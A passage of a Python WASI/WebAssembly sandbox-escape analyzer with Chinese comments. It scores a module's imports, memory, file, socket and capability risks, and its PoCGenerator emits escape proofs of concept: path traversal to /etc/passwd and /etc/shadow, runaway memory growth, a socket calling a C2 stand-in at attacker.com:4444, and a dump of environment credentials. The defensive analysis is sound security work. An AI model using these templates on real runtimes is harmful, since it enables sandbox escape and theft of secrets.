        ((WASICapability.ENVIRON_GET, WASICapability.ARGS_GET), "environ_get + args_get: 完整processcontext泄露", SeverityLevel.MEDIUM),
        ((WASICapability.SOCK_SEND, WASICapability.FD_READ), "sock_send + fd_read: 可将本地file内容send到network", SeverityLevel.CRITICAL),
        ((WASICapability.FD_READ, WASICapability.FD_WRITE), "fd_read + fd_write: 可读写filesystem", SeverityLevel.MEDIUM),
        ((WASICapability.PROC_EXEC, WASICapability.PATH_OPEN), "proc_exec + path_open: 可execute沙箱外程序", SeverityLevel.CRITICAL),
    ]

    @classmethod
    def analyze_capabilities(cls, imports):
        # 能力组合安全性分析
        if imports is None:
            return {
                "total_capabilities": 0,
                "dangerous_capabilities": [],
                "dangerous_combinations": [],
                "missing_sandboxing": [],
                "capability_score": 10.0,
            }

        set_caps = set()
        for imp in imports:
            if imp.capability != WASICapability.UNKNOWN:
                set_caps.add(imp.capability)

        lst_dangerous_caps = []
        for imp in imports:
            if imp.is_dangerous:
                lst_dangerous_caps.append(imp.capability)

        dct_result = {
            "total_capabilities": len(set_caps),
            "dangerous_capabilities": [c.value for c in set(lst_dangerous_caps)],
            "dangerous_combinations": [],
            "missing_sandboxing": [],
            "capability_score": 10.0,  # 初始满分，每项发现扣减
        }

        # 危险组合检查
        for combo, desc, sev in cls.DANGEROUS_CAPABILITY_COMBOS:
            if all(c in set_caps for c in combo):
                dct_result["dangerous_combinations"].append({
                    "capabilities": [c.value for c in combo],
                    "description": desc,
                    "severity": sev.value,
                })
                # 扣分值映射，结果clip至非负区间
                deduction = {SeverityLevel.CRITICAL: 3.0, SeverityLevel.HIGH: 2.0,
                             SeverityLevel.MEDIUM: 1.0, SeverityLevel.LOW: 0.5}
                f_deduction = deduction.get(sev, 0.5)
                dct_result["capability_score"] = min(max(dct_result["capability_score"] - f_deduction, 0.0), 10.0)

        # 缺失安全措施检查
        if WASICapability.PATH_OPEN in set_caps and WASICapability.PATH_SYMLINK not in set_caps:
            # path_open存在但未声明path_symlink，可能被运行时默认允许
            dct_result["missing_sandboxing"].append(
                "path_open 存在但未check符号链接limitstrategy")

        if WASICapability.SOCK_OPEN in set_caps:
            if WASICapability.SOCK_CONNECT not in set_caps and WASICapability.SOCK_BIND not in set_caps:
                pass  # sock_open独立存在可能为合法用例
            dct_result["missing_sandboxing"].append(
                "network功能enable但未detectednetwork访问控制strategy")

        if WASICapability.PROC_EXEC in set_caps:
            dct_result["missing_sandboxing"].append(
                "proc_exec 存在 — processexecute是最危险的WASI能力")

        # 分数归一化，clip至有效区间
        f_score = dct_result["capability_score"]
        dct_result["capability_score"] = round(min(max(f_score, 0.0), 10.0), 1)

        return dct_result

class PoCGenerator:
    # 沙箱逃逸PoC生成器

    @classmethod
    def generate_fs_escape_poc(cls, preopen_path, target_path):
        # 文件系统逃逸PoC生成
        return f'''// filesystem沙箱逃逸 PoC
// 预打开directory: {preopen_path}
// target file: {target_path}

// C pseudocode:
int escape_fs_sandbox(void) {{
    // 利用 path_open 访问预打开directory外的file
    // 如果path包含 ../ 且未正确normalize, 可逃逸
    int fd = __wasi_path_open(
        3,                          // 预打开fd
        0,                          // dirflags (0 = follow symlinks)
        "../..{target_path}",       // path穿越负载
        0,                          // oflags
        0xFFFFFFFF, 0xFFFFFFFF,     // fs_rights (全部权限)
        0,                          // fs_flags
        &fd
    );
    if (fd >= 0) {{
        // successful逃逸 - 可读写沙箱外file
        char buf[256];
        __wasi_fd_read(fd, (__wasi_iovec_t[]){{ {{buf, sizeof(buf)}} }}, 1, NULL);
        __wasi_fd_write(1, (__wasi_ciovec_t[]){{ {{buf, sizeof(buf)}} }}, 1, NULL);
    }}
    return fd >= 0;
}}'''

    @classmethod
    def generate_memory_escape_poc(cls, target_size_pages):
        """内存逃逸PoC生成"""
        return f'''// 线性memory沙箱逃逸 PoC
// target: 通过 memory.grow 突破 guard page

// WAT pseudocode:
(module
  (memory (export "memory") 256)   // 初始 256 页 = 16MiB
  (func (export "escape")
    // 反复增长memory直到突破 guard page
    (loop $grow
      (memory.grow (i32.const 1))
      (drop)
      (br $grow)  // 无限loop增长
    )
  )
)

// 如果run时未正确实现 guard page  or  4GB 上限check,
// memory增长可能:
// 1. 突破 guard page 并覆盖相邻memory区域
// 2. integer overflow导致 wrap-around, 访问低address区域
// 3. OOM 导致宿hostdenial of service'''

    @classmethod
    def generate_socket_escape_poc(cls, target_host, target_port):
        # 网络逃逸PoC生成
        return f'''// network沙箱逃逸 PoC
// target: {target_host}:{target_port}

// C pseudocode:
int escape_network_sandbox(void) {{
    int sock = -1;
    // create TCP socket
    __wasi_sock_open(
        2,      // AF_INET
        1,      // SOCK_STREAM
        0,      // protocol
        &sock
    );
    if (sock < 0) return 0;

    // connect到外部C2service器
    __wasi_sock_connect(sock, "{target_host}", {target_port});

    // send逃逸确认 / 泄露data
    const char *msg = "Sandbox escaped!";
    __wasi_sock_send(sock, msg, strlen(msg), 0, NULL);

    // receive命令
    char cmd[1024];
    __wasi_sock_recv(sock, cmd, sizeof(cmd), 0, NULL);

    return 1;
}}'''

    @classmethod
    def generate_environ_leak_poc(cls):
        # 环境变量泄露PoC生成
        return '''// environment variableinformation disclosure PoC

int leak_environment(void) {
    size_t nCount, buf_size;
    __wasi_environ_sizes_get(&nCount, &buf_size);

    char *env_buf = malloc(buf_size);
    char *env_ptrs[nCount];
    __wasi_environ_get(env_ptrs, env_buf);

    // 泄露所有environment variable到stdout
    for (size_t i = 0; i < nCount; i++) {
        __wasi_fd_write(1, env_ptrs[i], strlen(env_ptrs[i]), NULL);
        __wasi_fd_write(1, "\\n", 1, NULL);
    }

    // 可能泄露:
    // - PATH, HOME, USER, HOSTNAME
    // - AWS_*, K8S_*, DOCKER_* 等云凭证
    // - DATABASE_URL, API_KEY 等secret key
    return nCount > 0;
}'''

# 主分析器

class WASISandboxEscapeAnalyzer(BaseAnalyzer):
    # WASI沙箱逃逸分析器——综合分析WASM模块的沙箱逃逸可能性

    def __init__(self):
        super().__init__()
        self.wasm_path = ""
        self.imports_data = []
        self.wasm_sections = {}
        self.fd_trace = []
        self.socket_ops = []
        self.preopens = []
        self.bytecode_text = ""

    @classmethod
    def get_metadata(cls):
        return AnalyzerMetadata(
            name="WASI Sandbox Escape Analyzer",
            type=AnalyzerType.VULNERABILITY_DETECTOR,
            version="1.0.0",
            description="WASI沙箱逃逸analyzer - 检测WASMmodule通过WASIinterface逃逸沙箱的潜在path",
            author="BinaryAnalysisPlatform",
            dependencies=["wasi_sandbox_analyzer", "wasm_analyzer"],
            supported_platforms=["wasm", "wasi"],
        )

    def validate_input(self, **kwargs):
        wasm_path = kwargs.get("wasm_path", "")
        if not wasm_path:
            return True, None  # 支持无文件路径仅提供导入数据的分析模式
        import os
        if not os.path.exists(wasm_path):
            return False, f"WASMfile not found: {wasm_path}"
        return True, None

    def analyze(self, **kwargs):
        """
        执行WASI沙箱逃逸分析
        """
        try:
            # 1. initializedata — None guard
            self.wasm_path = kwargs.get("wasm_path", "")
            self.imports_data = kwargs.get("imports", [])
            self.wasm_sections = kwargs.get("wasm_sections", {})
            self.fd_trace = kwargs.get("fd_trace", [])
            self.socket_ops = kwargs.get("socket_ops", [])
            self.preopens = kwargs.get("preopens", [])
            self.bytecode_text = kwargs.get("bytecode_text", "")

            # 未提供import数据时，尝试从wasm_analyzer获取
            if not self.imports_data and self.wasm_path:
                self.imports_data = self._extract_imports_from_path()

            # 2. WASI导入分析
            import_entries = WASIImportAnalyzer.analyze(self.imports_data)

            lst_dangerous = []
            i_d_idx = 0
            i_d_len = len(import_entries)
            while i_d_idx < i_d_len:
                if import_entries[i_d_idx].is_dangerous:
                    lst_dangerous.append(import_entries[i_d_idx])
                i_d_idx += 1

            # 3. 内存逃逸分析
            memory_pattern = MemoryEscapeAnalyzer.analyze_memory_growth(self.wasm_sections)
            table_pattern = MemoryEscapeAnalyzer.analyze_table_manipulation(self.wasm_sections)
            bytecode_findings = MemoryEscapeAnalyzer.scan_bytecode_for_patterns(self.bytecode_text)

            # 4. 文件系统逃逸分析
            fd_operations = FileSystemEscapeAnalyzer.analyze_fd_operations(self.fd_trace)
            preopen_findings = FileSystemEscapeAnalyzer.detect_preopen_abuse(self.preopens)

            # 5. 网络逃逸分析
            socket_analysis = NetworkEscapeAnalyzer.analyze_socket_usage(self.socket_ops)

            # 6. 能力模型分析
            capability_analysis = CapabilityModelAnalyzer.analyze_capabilities(import_entries)

            # 7. 逃逸向量列表构建
            escape_vectors = self._build_escape_vectors(
                import_entries=import_entries,
                dangerous_imports=lst_dangerous,
                memory_pattern=memory_pattern,
                table_pattern=table_pattern,
                bytecode_findings=bytecode_findings,
                fd_operations=fd_operations,
                preopen_findings=preopen_findings,
                socket_analysis=socket_analysis,
                capability_analysis=capability_analysis,
            )

            # 8. 总体风险评估
            overall_risk, risk_score = self._calculate_overall_risk(
                escape_vectors=escape_vectors,
                memory_pattern=memory_pattern,
                table_pattern=table_pattern,
                capability_analysis=capability_analysis,
            )

            # 9. 沙箱类型推断
            sandbox_type = self._infer_sandbox_type(self.imports_data)

            # 10. 评估结果构建
            lst_dangerous_caps = []
            i_cap_idx = 0
            i_cap_len = len(capability_analysis["dangerous_capabilities"])
            while i_cap_idx < i_cap_len:
                lst_dangerous_caps.append(WASICapability(capability_analysis["dangerous_capabilities"][i_cap_idx]))
                i_cap_idx += 1

            assessment = SandboxAssessment(
                sandbox_type=sandbox_type,
                total_imports=len(import_entries),
                dangerous_imports=len(lst_dangerous),
                capability_count=capability_analysis["total_capabilities"],
                dangerous_capabilities=lst_dangerous_caps,
                memory_risk=self._memory_risk_level(memory_pattern, bytecode_findings),
                table_risk=self._table_risk_level(table_pattern),
                fs_risk=self._fs_risk_level(fd_operations, preopen_findings),
                network_risk=self._network_risk_level(socket_analysis),
                overall_risk=overall_risk,
                escape_vectors=escape_vectors,
                risk_score=risk_score,
            )

            # 统计各级别逃逸向量数量
            i_crit = 0
            i_high = 0
            i_med = 0
            i_v_idx = 0
            i_v_len = len(escape_vectors)
            while i_v_idx < i_v_len:
                v = escape_vectors[i_v_idx]
                if v.severity == SeverityLevel.CRITICAL:
                    i_crit += 1
                elif v.severity == SeverityLevel.HIGH:
                    i_high += 1
                elif v.severity == SeverityLevel.MEDIUM:
                    i_med += 1
                i_v_idx += 1

            return {
                "success": True,
                "assessment": assessment.to_dict(),
                "import_entries": [e.to_dict() for e in import_entries],
                "fd_operations": [f.to_dict() for f in fd_operations],
                "memory_pattern": memory_pattern.to_dict(),
                "table_pattern": table_pattern.to_dict(),
                "bytecode_findings": bytecode_findings,
                "preopen_findings": preopen_findings,
                "socket_analysis": socket_analysis,
                "capability_analysis": capability_analysis,
                "escape_vector_count": len(escape_vectors),
                "critical_count": i_crit,
                "high_count": i_high,
                "medium_count": i_med,
            }

        except Exception as e:
            logger.error(f"WASI沙箱逃逸analysis failed: {e}", exc_info=True)
            return {
                "success": False,
                "error": str(e),
                "assessment": None,
                "escape_vector_count": 0,
            }

    def _extract_imports_from_path(self):
        # 从WASM文件提取导入信息（通过分析工具）
        lst_imports = []
        try:
            import subprocess
            import json
            r = subprocess.run(
                ['r2', '-q', '-c', 'iij; q', self.wasm_path],
                capture_output=True, text=True, timeout=60,
                encoding='utf-8', errors='replace'
            )
            if r.stdout.strip():
                syms = json.loads(r.stdout)
                i_idx = 0
                i_len = len(syms)
                while i_idx < i_len:
                    sym = syms[i_idx]
                    lst_imports.append({
                        "module": sym.get("lib", "unknown"),
                        "name": sym.get("name", ""),
                        "function": sym.get("name", ""),
                    })
                    i_idx += 1
        except Exception as e:
            logger.debug(f"从WASMpathextractimportfailed: {e}")

        # 回退方案：读取已有分析器输出
        if not lst_imports:
            try:
                from wasi_sandbox_analyzer import WASISandboxAnalyzer  # 相对导入已失效，改用绝对路径
                analyzer = WASISandboxAnalyzer(self.wasm_path)
                parsed = analyzer.parse_imports()
                i_idx2 = 0
                i_len2 = len(parsed)
                while i_idx2 < i_len2:
                    imp = parsed[i_idx2]
                    lst_imports.append({
                        "module": imp.module,
                        "name": imp.function,
                        "function": imp.function,
                    })
                    i_idx2 += 1
            except Exception as e2:
                logger.debug(f"备用importextractfailed: {e2}")

        return lst_imports

    def _build_escape_vectors(
        self,
        import_entries,
        dangerous_imports,
        memory_pattern,
        table_pattern,
        bytecode_findings,
        fd_operations,
        preopen_findings,
        socket_analysis,
        capability_analysis,
    ):
        # 逃逸向量列表构建
        if import_entries is None:
            import_entries = []
        if dangerous_imports is None:
            dangerous_imports = []
        if bytecode_findings is None:
            bytecode_findings = []
        if fd_operations is None:
            fd_operations = []
        if preopen_findings is None:
            preopen_findings = []
        if socket_analysis is None:
            socket_analysis = {}
        if capability_analysis is None:
            capability_analysis = {}

        lst_vectors = []

        i_vid = 0

        # --- 向量1：危险WASI导入 ---
        i_idx = 0
        i_len = len(dangerous_imports)
        while i_idx < i_len:
            imp = dangerous_imports[i_idx]
            i_vid += 1
            # 严重性判定——基于能力类型
            if imp.capability in (
                WASICapability.PROC_EXEC, WASICapability.SOCK_OPEN,
                WASICapability.PATH_OPEN
            ):
                sev = SeverityLevel.HIGH
            else:
                sev = SeverityLevel.MEDIUM

            sz_poc = ""
            if imp.capability == WASICapability.PATH_OPEN:
                sz_poc = PoCGenerator.generate_fs_escape_poc("/sandbox", "/etc/passwd")
            elif imp.capability == WASICapability.SOCK_OPEN:
                sz_poc = PoCGenerator.generate_socket_escape_poc("attacker.com", 4444)
            elif imp.capability == WASICapability.ENVIRON_GET:
                sz_poc = PoCGenerator.generate_environ_leak_poc()

            lst_vectors.append(EscapeVector(
                vector_id=f"WASI-ESC-{i_vid:03d}",
                vector_type=EscapeVectorType.IMPORT_FUNCTION_HIJACK,
                severity=sev,
                title=f"危险WASIimport: {imp.function_name}",
                description=f"moduleimport了危险的WASI函数 {imp.module_name}.{imp.function_name}: {imp.risk_reason}",
                wasi_imports_involved=[imp.function_name],
                exploit_difficulty="easy" if imp.capability == WASICapability.ENVIRON_GET else "medium",
                poc_code=sz_poc,
                remediation=f"remove or limit {imp.function_name} 的访问权限",
                cwe_id="CWE-250" if imp.capability == WASICapability.PROC_EXEC else "CWE-284",
            ))
            i_idx += 1

        # --- 向量2：内存增长逃逸 ---
        if memory_pattern and memory_pattern.is_suspicious:
            i_vid += 1
            lst_vectors.append(EscapeVector(
                vector_id=f"WASI-ESC-{i_vid:03d}",
                vector_type=EscapeVectorType.MEMORY_GROW_ABUSE,
                severity=SeverityLevel.CRITICAL if memory_pattern.exceeds_guard else SeverityLevel.HIGH,
                title="线性memory增长可能突破沙箱boundary",
                description=memory_pattern.suspicion_reason,
                memory_pattern=memory_pattern,
                exploit_difficulty="medium",
                poc_code=PoCGenerator.generate_memory_escape_poc(memory_pattern.total_allocated_pages),
                remediation="setting合理的最大memory页数limit，确保 guard page size充足",
                cwe_id="CWE-787",
            ))

        # --- 向量3：Table操作逃逸 ---
        if table_pattern and table_pattern.is_suspicious:
            i_vid += 1
            lst_vectors.append(EscapeVector(
                vector_id=f"WASI-ESC-{i_vid:03d}",
                vector_type=EscapeVectorType.TABLE_MANIPULATION,
                severity=SeverityLevel.HIGH,
                title="Table操作可能劫持间接调用",
                description=table_pattern.suspicion_reason,
                table_pattern=table_pattern,
                exploit_difficulty="hard",
                remediation="limit table 最大size，validate元素段offset量",
                cwe_id="CWE-843",
            ))

        # --- 向量4：文件系统路径穿越 ---
        lst_dangerous_fds = []
        i_fd_idx = 0
        i_fd_len = len(fd_operations)
        while i_fd_idx < i_fd_len:
            if fd_operations[i_fd_idx].is_dangerous:
                lst_dangerous_fds.append(fd_operations[i_fd_idx])
            i_fd_idx += 1

        if lst_dangerous_fds:
            i_vid += 1
            sz_all_risks = "; ".join(f.risk_description for f in lst_dangerous_fds)
            # 利用难度判定：包含../路径穿越者难度更低
            b_has_traversal = any("../" in f.path for f in lst_dangerous_fds)
            lst_vectors.append(EscapeVector(
                vector_id=f"WASI-ESC-{i_vid:03d}",
                vector_type=EscapeVectorType.FD_PATH_TRAVERSAL,
                severity=SeverityLevel.CRITICAL,
                title="filesystempath穿越逃逸",
                description=f"detected危险的filedescription符操作: {sz_all_risks}",
                fd_operations=lst_dangerous_fds,
                exploit_difficulty="easy" if b_has_traversal else "medium",
                poc_code=PoCGenerator.generate_fs_escape_poc("/sandbox", "/etc/shadow"),
                remediation="实现pathnormalizecheck，禁止 ../ 穿越，limit预打开directoryrange",
                cwe_id="CWE-22",
            ))

        # --- 向量5：预打开目录滥用 ---
        i_pf_idx = 0
        i_pf_len = len(preopen_findings)
        while i_pf_idx < i_pf_len:
            pf = preopen_findings[i_pf_idx]
            if pf.get("severity") in ("CRITICAL", "HIGH"):
                i_vid += 1
                lst_vectors.append(EscapeVector(
                    vector_id=f"WASI-ESC-{i_vid:03d}",
                    vector_type=EscapeVectorType.FD_PREOPEN_LEAK,
                    severity=SeverityLevel.CRITICAL if pf.get("severity") == "CRITICAL" else SeverityLevel.HIGH,
                    title="预打开directory权限过大",
                    description=f"预打开directory {pf['preopen_path']} 存在风险: {pf['risk']}",
                    exploit_difficulty="easy",
                    remediation=f"缩小预打开directoryrange，避免暴露 {pf['preopen_path']}",
                    cwe_id="CWE-552",
                ))
            i_pf_idx += 1

        # --- 向量6：网络逃逸 ---
        if socket_analysis.get("external_connections"):
            i_vid += 1
            lst_vectors.append(EscapeVector(
                vector_id=f"WASI-ESC-{i_vid:03d}",
                vector_type=EscapeVectorType.SOCKET_ABUSE,
                severity=SeverityLevel.HIGH,
                title="network套接字逃逸",
                description=f"detected {len(socket_analysis['external_connections'])} 个外部connect尝试",
                exploit_difficulty="medium",
                poc_code=PoCGenerator.generate_socket_escape_poc("attacker.com", 4444),
                remediation="limitnetwork访问白名单，disable出站connect到外部address",
                cwe_id="CWE-923",
            ))

        if socket_analysis.get("risks"):
            i_r_idx = 0
            i_r_len = len(socket_analysis["risks"])
            while i_r_idx < i_r_len:
                risk = socket_analysis["risks"][i_r_idx]
                if risk.get("severity") == "CRITICAL":
                    i_vid += 1
                    lst_vectors.append(EscapeVector(
                        vector_id=f"WASI-ESC-{i_vid:03d}",
                        vector_type=EscapeVectorType.SOCKET_ABUSE,
                        severity=SeverityLevel.CRITICAL,
                        title=f"network逃逸: {risk.get('type', 'unknown')}",
                        description=risk.get("description", ""),
                        exploit_difficulty="medium",
                        remediation="disableoriginal套接字和危险network操作",
                    ))
                i_r_idx += 1

        # --- 向量7：危险能力组合 ---
        lst_combos = capability_analysis.get("dangerous_combinations", [])
        i_comb_idx = 0
        i_comb_len = len(lst_combos)
        while i_comb_idx < i_comb_len:
            combo = lst_combos[i_comb_idx]
            i_vid += 1
            sz_sev_str = combo.get("severity", "MEDIUM")
            # 严重性级别匹配
            sev = SeverityLevel.MEDIUM
            for s in [SeverityLevel.CRITICAL, SeverityLevel.HIGH, SeverityLevel.MEDIUM, SeverityLevel.LOW, SeverityLevel.INFO]:
                if s.value == sz_sev_str:
                    sev = s
                    break
            lst_vectors.append(EscapeVector(
                vector_id=f"WASI-ESC-{i_vid:03d}",
                vector_type=EscapeVectorType.CAPABILITY_CONFUSION,
                severity=sev,
                title="危险能力组合",
                description=combo.get("description", ""),
                wasi_imports_involved=combo.get("capabilities", []),
                exploit_difficulty="medium",
                remediation="实施最小权限原则，分离互斥的能力组合",
                cwe_id="CWE-1220",
            ))
            i_comb_idx += 1

        # --- 向量8：字节码级可疑模式 ---
        if bytecode_findings:
            lst_critical_bc = []
            i_bc_idx = 0
            i_bc_len = len(bytecode_findings)
            while i_bc_idx < i_bc_len:
                f = bytecode_findings[i_bc_idx]
                if f["pattern_type"] in ("call_indirect", "hi_offset_load", "hi_offset_store"):
                    lst_critical_bc.append(f)
                i_bc_idx += 1
            if lst_critical_bc:
                i_vid += 1
                lst_vectors.append(EscapeVector(
                    vector_id=f"WASI-ESC-{i_vid:03d}",
                    vector_type=EscapeVectorType.INDIRECT_CALL_HIJACK,
                    severity=SeverityLevel.HIGH,
                    title="字节码级别可疑mode",
                    description=f"detected {len(lst_critical_bc)} 种可疑字节码mode: "
                                f"{', '.join(f['pattern_type'] for f in lst_critical_bc)}",
                    exploit_difficulty="hard",
                    remediation="check并fix相关字节码mode，添加run时boundarycheck",
                    cwe_id="CWE-823",
                ))

        return lst_vectors

    def _calculate_overall_risk(
        self,
        escape_vectors,
        memory_pattern,
        table_pattern,
        capability_analysis,
    ):
        # 总体风险等级与分值计算
        if escape_vectors is None:
            escape_vectors = []
        if capability_analysis is None:
            capability_analysis = {}

        f_score = 10.0

        # 逐向量扣分
        deductions = {
            SeverityLevel.CRITICAL: 2.5,
            SeverityLevel.HIGH: 1.5,
            SeverityLevel.MEDIUM: 0.8,
            SeverityLevel.LOW: 0.3,
            SeverityLevel.INFO: 0.1,
        }

        i_idx = 0
        i_len = len(escape_vectors)
        while i_idx < i_len:
            v = escape_vectors[i_idx]
            f_score -= deductions.get(v.severity, 0.5)
            i_idx += 1

        # 内存模式额外扣分
        if memory_pattern and memory_pattern.is_suspicious:
            f_score -= 1.5 if memory_pattern.exceeds_guard else 0.5

        # Table模式额外扣分
        if table_pattern and table_pattern.is_suspicious:
            f_score -= 1.0

        # 能力分值加权
        f_cap_score = capability_analysis.get("capability_score", 10.0)
        f_score = (f_score + f_cap_score) / 2.0

        f_score = round(min(max(f_score, 0.0), 10.0), 1)

        # 等级判定
        if f_score <= 2.0:
            level = SeverityLevel.CRITICAL
        elif f_score <= 4.0:
            level = SeverityLevel.HIGH
        elif f_score <= 6.0:
            level = SeverityLevel.MEDIUM
        elif f_score <= 8.0:
            level = SeverityLevel.LOW
        else:
            level = SeverityLevel.INFO

        return level, f_score

    def _infer_sandbox_type(self, imports):
        # 沙箱实现类型推断
        if imports is None:
            return WASISandboxType.UNKNOWN

        set_modules = set()
        for imp in imports:
            sz_mod = imp.get("module", "").lower()
            if "wasi" in sz_mod:
                set_modules.add(sz_mod)

        # 基于导入模块名称推断
        sz_module_str = " ".join(set_modules)
        if "wasi_snapshot_preview1" in sz_module_str:
            return WASISandboxType.WASI_SDK
        elif "wasi_unstable" in sz_module_str:
            return WASISandboxType.LUCET
        elif "wasix" in sz_module_str:
            return WASISandboxType.WASMER
        elif "wasi_ephemeral" in sz_module_str:
            return WASISandboxType.WASMTIME

        # 基于导入函数特征推断
        set_import_names = set()
        for imp in imports:
            set_import_names.add(imp.get("name", "").lower())

        if "wasi_snapshot_preview1" in set_modules or any("wasi" in m for m in set_modules):
            if "sock_open" in set_import_names:
                return WASISandboxType.WASMEDGE
            return WASISandboxType.WASI_SDK

        return WASISandboxType.UNKNOWN

    @staticmethod
    def _memory_risk_level(pattern, findings):
        if pattern is None:
            return SeverityLevel.LOW
        if findings is None:
            findings = []
        if pattern.exceeds_guard:
            return SeverityLevel.CRITICAL
        if pattern.is_suspicious:
            return SeverityLevel.HIGH
        if findings:
            return SeverityLevel.MEDIUM
        return SeverityLevel.LOW

    @staticmethod
    def _table_risk_level(pattern):
        if pattern is None:
            return SeverityLevel.LOW
        if pattern.grow_operations > 0 and pattern.indirect_calls_targeting > 50:
            return SeverityLevel.CRITICAL
        if pattern.is_suspicious:
            return SeverityLevel.HIGH
        if pattern.element_segments > 10:
            return SeverityLevel.MEDIUM
        return SeverityLevel.LOW

    @staticmethod
    def _fs_risk_level(fd_ops, preopen_findings):
        if fd_ops is None:
            fd_ops = []
        if preopen_findings is None:
            preopen_findings = []

        b_has_critical_preopen = any(p.get("severity") == "CRITICAL" for p in preopen_findings)
        b_has_dangerous_fd = any(f.is_dangerous for f in fd_ops)

        if b_has_critical_preopen:
            return SeverityLevel.CRITICAL
        if b_has_dangerous_fd:
            return SeverityLevel.HIGH
        if fd_ops or preopen_findings:
            return SeverityLevel.MEDIUM
        return SeverityLevel.LOW

    @staticmethod
    def _network_risk_level(socket_analysis):
        if socket_analysis is None:
            return SeverityLevel.LOW
        if socket_analysis.get("external_connections"):
            return SeverityLevel.HIGH
        if socket_analysis.get("listen_sockets", 0) > 0:
            return SeverityLevel.MEDIUM
        if socket_analysis.get("total_sockets", 0) > 0:
            return SeverityLevel.MEDIUM
        return SeverityLevel.LOW

# 便捷函数

def analyze_wasi_sandbox_escape(**kwargs):
    # 便捷函数：执行WASI沙箱逃逸分析
    analyzer = WASISandboxEscapeAnalyzer()
    analyzer.initialize(kwargs.get("config"))
    result = analyzer.analyze(**kwargs)
    analyzer.finalize()
    return result

def quick_scan_imports(imports):
    """快速扫描导入列表中的危险项"""
    if imports is None:
        return {
            "total_imports": 0,
            "dangerous_count": 0,
            "dangerous_imports": [],
            "safe_count": 0,
        }
    entries = WASIImportAnalyzer.analyze(imports)
    lst_dangerous = []
    i_idx = 0
    i_len = len(entries)
    while i_idx < i_len:
        if entries[i_idx].is_dangerous:
            lst_dangerous.append(entries[i_idx].to_dict())
        i_idx += 1
    return {
        "total_imports": len(entries),
        "dangerous_count": len(lst_dangerous),
        "dangerous_imports": lst_dangerous,
        "safe_count": len(entries) - len(lst_dangerous),
    }

def check_fd_path_traversal(fd_trace):
    """检查fd操作中的路径穿越"""
    if fd_trace is None:
        return []
    ops = FileSystemEscapeAnalyzer.analyze_fd_operations(fd_trace)
    lst_result = []
    i_idx = 0
    i_len = len(ops)
    while i_idx < i_len:
        if ops[i_idx].is_dangerous:
            lst_result.append(ops[i_idx])
        i_idx += 1
    return lst_result

def generate_escape_poc(vector_type, **kwargs):
    # 按逃逸类型生成PoC
    generators = {
        "fs_escape": lambda: PoCGenerator.generate_fs_escape_poc(
            kwargs.get("preopen_path", "/sandbox"),
            kwargs.get("target_path", "/etc/passwd"),
        ),
        "memory_escape": lambda: PoCGenerator.generate_memory_escape_poc(
            kwargs.get("target_size_pages", 65536),
        ),
        "socket_escape": lambda: PoCGenerator.generate_socket_escape_poc(
            kwargs.get("target_host", "attacker.com"),
            kwargs.get("target_port", 4444),
        ),
        "environ_leak": PoCGenerator.generate_environ_leak_poc,
    }

    gen = generators.get(vector_type)
    if gen:
        return gen()
    return f"// Unknown escape vector type: {vector_type}"
